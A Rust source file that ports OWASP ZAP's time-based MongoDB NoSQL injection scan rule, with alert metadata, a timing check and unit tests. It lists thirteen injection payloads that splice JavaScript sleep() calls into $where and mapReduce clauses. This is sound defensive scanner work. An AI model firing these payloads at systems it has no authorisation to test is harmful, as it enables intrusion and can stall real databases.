//! Ported from ZAP MongoDbInjectionTimingScanRule (ascanrulesBeta, Apache License 2.0).
//!
//! The payloads write the delay in seconds, as ZAP does, though MongoDB's `sleep()` takes
//! milliseconds and a `$where` clause runs it once per document. So the delay measured is
//! `seconds / 1000 * documents`, and the check only passes for roughly 1,000 documents.
//! Asking for real seconds would find more, but could hold a large collection for hours
//! after the request timed out. Difference: no technology filter; ZAP only runs this
//! against targets it knows use MongoDB, and by default assumes all do.

use super::common::{by_strength, point};
use super::timing::{check_timing, sleep_seconds, whole_seconds, TimingOutcome};
use crate::scan::active::{ActiveRule, BoxFuture, Cx, RuleScope};
use crate::scan::{AlertDef, Confidence, Risk};

static ALERT: AlertDef = AlertDef {
    alert_ref: "90039",
    name: "NoSQL Injection - MongoDB (Time Based)",
    risk: Risk::High,
    confidence: Confidence::Medium,
    cwe: 943,
    wasc: 19,
    description: "MongoDB query injection may be possible.",
    solution: "Do not trust client side input and escape all data on the server side.\nAvoid to use the query input \
        directly into the where and group clauses and upgrade all drivers at the latest available version.",
    references: &[
        "https://arxiv.org/pdf/1506.04082",
        "https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection.html",
    ],
    tags: &[
        "API_2023_API10",
        "OWASP_2025_A05",
        "OWASP_2021_A03",
        "OWASP_2017_A01",
        "WSTG-v42-INPV-05",
        "HIPAA",
        "PCI_DSS",
        "TEST_TIMING",
    ],
};

static ALERTS: [&AlertDef; 1] = [&ALERT];

const OTHER_INFO: &str =
    "Through the where or group MongoDB clauses, Javascript sleep function is probably executable.";

/// `{0}` is the delay.
const SLEEP_INJECTION: [&str; 13] = [
    // Attacking a $where clause: function() { var x = md5( some_input ); return this.password == x;}
    "\"); sleep({0}); print(\"",
    "'; sleep({0}); print('",
    "0); sleep({0}); print(\"",
    // function() { var x = this.value == some_input; return x;}
    "'; sleep({0}); var x='",
    "\"; sleep({0}); var x=\"",
    "0; sleep({0})",
    // function() { return this.value == some_input }
    "zap' || sleep({0}) && 'zap'=='zap",
    "zap\" || sleep({0}) && \"zap\"==\"zap",
    "0 || sleep({0})",
    // function() { return this.value == some_function(some_input) }
    "zap') || sleep({0}) && hex_md5('zap",
    "zap\") || sleep({0}) && md5(\"zap",
    "0)  || sleep({0})",
    // Attacking a mapReduce clause (only for old versions of MongoDB)
    "_id);}, function(inj) { sleep({0});return 1;}, { out: 'x'}); db.injection.mapReduce(function() { emit(1,1",
];

/// How many payloads to try at LOW, MEDIUM, HIGH, INSANE.
const LIMITS: [usize; 4] = [6, 10, 12, SLEEP_INJECTION.len()];

/// `seconds` as Java writes a double, like ZAP's request sender.
fn payload(template: &str, seconds: f64) -> String {
    template.replace("{0}", &format!("{seconds:?}"))
}

pub struct MongoDbInjectionTiming;

impl ActiveRule for MongoDbInjectionTiming {
    fn id(&self) -> u32 {
        90039
    }

    fn name(&self) -> &'static str {
        "NoSQL Injection - MongoDB (Time Based)"
    }

    fn alerts(&self) -> &'static [&'static AlertDef] {
        &ALERTS
    }

    fn scope(&self) -> RuleScope {
        RuleScope::Param
    }

    fn scan<'a>(&'a self, cx: &'a Cx) -> BoxFuture<'a> {
        Box::pin(async move {
            let (param, value) = point(cx);
            let sleep = sleep_seconds();
            for template in SLEEP_INJECTION.iter().take(by_strength(cx.strength(), LIMITS)) {
                if cx.stopped() {
                    return;
                }
                let outcome =
                    check_timing(cx, sleep, |x| format!("{value}{}", payload(template, x)), whole_seconds).await;
                if let TimingOutcome::Injectable(t) = outcome {
                    let attack = template.replace("{0}", &sleep.to_string());
                    cx.report(ALERT.raise(param, "").attack(attack).other_info(OTHER_INFO), &t.last);
                    return;
                }
            }
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn writes_seconds_like_zap() {
        assert_eq!(payload("0; sleep({0})", 5.0), "0; sleep(5.0)");
        assert_eq!(payload("0; sleep({0})", 1.0), "0; sleep(1.0)");
    }

    #[test]
    fn every_payload_can_run_at_insane() {
        assert_eq!(LIMITS[3], 13);
        assert!(SLEEP_INJECTION.iter().all(|t| t.contains("{0}")));
    }
}
